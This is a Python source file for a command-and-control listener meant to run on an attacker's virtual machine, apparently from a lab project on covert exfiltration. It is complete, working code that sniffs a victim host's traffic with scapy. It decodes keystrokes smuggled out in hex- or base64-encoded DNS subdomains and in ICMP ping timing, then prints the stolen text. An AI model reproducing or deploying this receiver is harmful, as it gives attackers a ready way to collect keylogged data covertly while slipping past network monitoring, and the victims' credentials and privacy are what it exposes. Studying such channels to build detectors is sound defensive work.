"""
c2_listener.py
==============
Unified Command & Control (C2) Listener — Attacker VM (10.0.0.5)

Runs two independent sniff loops simultaneously using daemon threads:

  Thread 1 — DNSListener
      Captures outbound DNS queries from the victim.
      Decodes the subdomain payload using HEX (current dns_exfil.py)
      OR Base64 (older dns_exfil.py) — handles both automatically.

  Thread 2 — ICMPListener
      Captures ICMP Echo Requests from the victim.
      Measures inter-arrival timing to decode binary bits → characters.

  Main Thread
      Launches both threads and blocks until Ctrl+C.

Run on Attacker VM (10.0.0.5):
    sudo python3 c2_listener.py
"""

from scapy.all import sniff, IP, ICMP, DNS, DNSQR, get_if_list
import threading
import base64
import time
import re

# ============================================================
#   SHARED CONFIGURATION
# ============================================================
INTERFACE   = "eth0"       # Change if your interface is ens33, eth1, etc.
VICTIM_IP   = "10.0.0.6"

# --- DNS ---
TARGET_DOMAIN     = "test.google.com"   # must match dns_exfil.py
MIN_SUBDOMAIN_LEN = 6

# --- ICMP timing thresholds (from icmp_receiver.py) ---
DOT_LIMIT  = 0.4   # delta < 0.4s  → binary '0'  (sender uses 0.2s)
DASH_LIMIT = 0.9   # delta < 0.9s  → binary '1'  (sender uses 0.6s)
                   # delta ≥ 0.9s  → end of character

# Pre-compiled patterns for dual-encoding DNS detection
_HEX_RE = re.compile(r'^[0-9a-f]+$')
_B64_RE = re.compile(r'^[A-Za-z0-9+/=_-]+$')


# ============================================================
#   SHARED DECODE HELPERS
# ============================================================

def _detect_encoding(subdomain: str) -> str:
    """
    Returns 'HEX', 'BASE64', or 'NONE'.
    Mirrors the same logic used in detector_integrated.py.
    """
    if len(subdomain) < MIN_SUBDOMAIN_LEN:
        return "NONE"
    if len(subdomain) % 2 == 0 and bool(_HEX_RE.match(subdomain)):
        return "HEX"
    if (any(c.isupper() for c in subdomain)
            and bool(_B64_RE.match(subdomain))):
        return "BASE64"
    return "NONE"


def _decode(subdomain: str, encoding: str) -> str:
    """Reverses the detected encoding to recover stolen keystrokes."""
    if encoding == "HEX":
        try:
            return bytes.fromhex(subdomain).decode('utf-8', errors='replace')
        except Exception:
            return "[hex decode failed]"
    if encoding == "BASE64":
        try:
            pad = subdomain + "=" * ((4 - len(subdomain) % 4) % 4)
            return base64.urlsafe_b64decode(pad).decode('utf-8', errors='replace')
        except Exception:
            return "[base64 decode failed]"
    return ""


# ============================================================
#   DNS LISTENER
# ============================================================

class DNSListener:
    """
    Listens for DNS queries from VICTIM_IP on UDP port 53.
    Detects and decodes covert exfiltration payloads embedded
    in the subdomain of queries targeting TARGET_DOMAIN.

    Handles both encodings transparently:
      HEX    — current dns_exfil.py  (data.encode().hex())
      BASE64 — older dns_exfil.py    (urlsafe_b64encode)
    """

    def __init__(self):
        self._count = 0   # packets captured

    def _callback(self, packet):
        """Scapy calls this for every DNS packet on the interface."""
        # Must be a DNS Question (qr=0), not a reply
        if not (packet.haslayer(DNS) and packet.haslayer(DNSQR)):
            return
        if packet[DNS].qr != 0:
            return

        # Decode the queried name
        try:
            query = packet[DNSQR].qname.decode('utf-8').rstrip('.')
        except Exception:
            return

        # Only process queries targeting the covert domain
        if TARGET_DOMAIN not in query:
            return

        # Isolate the subdomain payload
        subdomain = query.split('.')[0]
        encoding  = _detect_encoding(subdomain)

        if encoding == "NONE":
            return   # Not a covert payload — ignore silently

        # Decode and display
        keystrokes = _decode(subdomain, encoding)
        self._count += 1

        print(f"\n[DNS #{self._count}] Keystroke captured!")
        print(f"  Encoding  : {encoding}")
        print(f"  Raw Query : {query}")
        print(f"  Payload   : {subdomain}")
        print(f"  Decoded   : {keystrokes!r}")
        print(f"  Time      : {time.strftime('%H:%M:%S')}\n")

    def start(self):
        """Blocking — run this inside a dedicated thread."""
        print(f"[DNS] Listener started → interface={INTERFACE} "
              f"| filter=udp port 53 | target=*.{TARGET_DOMAIN}\n")
        sniff(
            iface   = INTERFACE,
            filter  = f"udp port 53 and src host {VICTIM_IP}",
            prn     = self._callback,
            store   = 0,
        )


# ============================================================
#   ICMP LISTENER
# ============================================================

class ICMPListener:
    """
    Listens for ICMP Echo Requests from VICTIM_IP.
    Decodes binary data encoded in inter-arrival timing gaps.

    Protocol (must match icmp_exfil.py):
      delta < DOT_LIMIT  (0.4s) → bit '0'
      delta < DASH_LIMIT (0.9s) → bit '1'
      delta ≥ DASH_LIMIT        → end of 8-bit character

    All state is instance-scoped — no globals, fully thread-safe.
    """

    def __init__(self):
        self._last_time      = 0.0
        self._current_binary = ""
        self._received_text  = ""
        self._char_count     = 0

    def _callback(self, packet):
        """Scapy calls this for every ICMP packet on the interface."""
        # Only Echo Requests (type=8) from our victim
        if not packet.haslayer(IP):
            return
        if packet[IP].src != VICTIM_IP:
            return
        if not packet.haslayer(ICMP) or packet[ICMP].type != 8:
            return

        current_time = time.time()

        # First packet — synchronise the clock
        if self._last_time == 0.0:
            self._last_time = current_time
            print(f"[ICMP] Clock synced with {VICTIM_IP}. Decoding...\n")
            return

        # Calculate inter-arrival delta
        delta = current_time - self._last_time
        self._last_time = current_time

        # Decode the timing into a bit
        if delta < DOT_LIMIT:
            self._current_binary += "0"
            print(".", end="", flush=True)

        elif delta < DASH_LIMIT:
            self._current_binary += "1"
            print("-", end="", flush=True)

        else:
            # Gap ≥ DASH_LIMIT → end of character
            self._flush_character()

        # Failsafe: binary buffer should never exceed 8 bits
        if len(self._current_binary) > 8:
            self._current_binary = ""

    def _flush_character(self):
        """Converts the current 8-bit binary string to a character."""
        if len(self._current_binary) == 8:
            try:
                char = chr(int(self._current_binary, 2))
                self._received_text += char
                self._char_count += 1
                print(f"  [ICMP #{self._char_count}] Captured: {char!r}  "
                      f"(binary={self._current_binary})")
            except ValueError:
                print(f"  [ICMP] Invalid byte: {self._current_binary}")

        elif len(self._current_binary) > 0:
            # Partial byte — discard silently (sync noise)
            pass

        self._current_binary = ""   # always reset after a gap

    def start(self):
        """Blocking — run this inside a dedicated thread."""
        print(f"[ICMP] Listener started → interface={INTERFACE} "
              f"| victim={VICTIM_IP} "
              f"| DOT<{DOT_LIMIT}s | DASH<{DASH_LIMIT}s\n")
        sniff(
            iface   = INTERFACE,
            filter  = f"icmp and src host {VICTIM_IP}",
            prn     = self._callback,
            store   = 0,
        )


# ============================================================
#   ENTRY POINT
# ============================================================
if __name__ == "__main__":

    # ── Startup banner ────────────────────────────────────────
    print("=" * 60)
    print("  Unified C2 Listener — Attacker VM")
    print("=" * 60)
    print(f"  Interface : {INTERFACE}")
    print(f"  Victim    : {VICTIM_IP}")
    print()
    print("  Available network interfaces:")
    for iface in get_if_list():
        marker = "  ◄ active" if iface == INTERFACE else ""
        print(f"    - {iface}{marker}")
    print()
    print("  Channels  : DNS (udp/53)  +  ICMP (timing)")
    print("  Encoding  : DNS=HEX|BASE64  |  ICMP=timing-binary")
    print("=" * 60 + "\n")

    # ── Instantiate listeners ─────────────────────────────────
    dns_listener  = DNSListener()
    icmp_listener = ICMPListener()

    # ── Launch each listener in its own daemon thread ─────────
    # daemon=True ensures both threads exit automatically when
    # the main thread receives Ctrl+C — no zombie threads.
    dns_thread = threading.Thread(
        target = dns_listener.start,
        name   = "DNSListener",
        daemon = True,
    )
    icmp_thread = threading.Thread(
        target = icmp_listener.start,
        name   = "ICMPListener",
        daemon = True,
    )

    dns_thread.start()
    icmp_thread.start()

    print(f"[*] Both listeners running. Press Ctrl+C to stop.\n")

    # ── Main thread — keep alive, handle Ctrl+C cleanly ───────
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[*] Shutting down C2 listener...")
        print(f"[*] DNS  packets decoded : {dns_listener._count}")
        print(f"[*] ICMP chars decoded   : {icmp_listener._char_count}")
        print(f"[*] ICMP full text       : {icmp_listener._received_text!r}")
        print("[*] Done.\n")
